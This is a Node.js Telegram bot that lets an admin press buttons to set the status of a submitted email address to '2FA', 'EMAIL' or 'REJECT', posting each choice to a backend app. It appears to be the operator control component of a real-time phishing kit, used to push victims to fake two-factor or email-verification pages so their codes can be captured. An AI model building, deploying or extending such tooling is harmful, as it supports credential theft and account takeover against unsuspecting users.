const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing env vars");
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, {
  polling: { autoStart: true, params: { timeout: 10 } }
});

bot.getMe().then(() => {
  console.log(`✅ Bot connected`);
}).catch(err => {
  console.error("❌ Bot failed:", err.message);
});

const handledCallbacks = new Set();

bot.on("callback_query", async (query) => {
  const callbackId = query.id;
  
  if (handledCallbacks.has(callbackId)) return;
  handledCallbacks.add(callbackId);

  try {
    const [action, email] = query.data.split("|");

    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : "REJECT"}`);

    const response = await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, status: action })
    });

    if (response.ok) {
      // Remove buttons from original message
      try {
        const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
        await fetch(editUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: query.message?.message_id,
            text: query.message?.text,
            parse_mode: "HTML"
          })
        });
      } catch (err) {}

      // Send status reply
      let statusMessage = "";
      if (action === "page1") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "page2") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "reject") {
        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
      }

      try {
        const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await fetch(replyUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            text: statusMessage,
            parse_mode: "HTML"
          })
        });
      } catch (err) {}
    }

    bot.answerCallbackQuery(callbackId, {
      text: `✅ ${action.toUpperCase()}`,
      show_alert: false
    }).catch(() => {});

  } catch (err) {
    console.error("❌ Error:", err.message);
    bot.answerCallbackQuery(query.id, {
      text: "❌ Error",
      show_alert: true
    }).catch(() => {});
  }
});

console.log(`✅ Bot ready`);

module.exports = { bot };
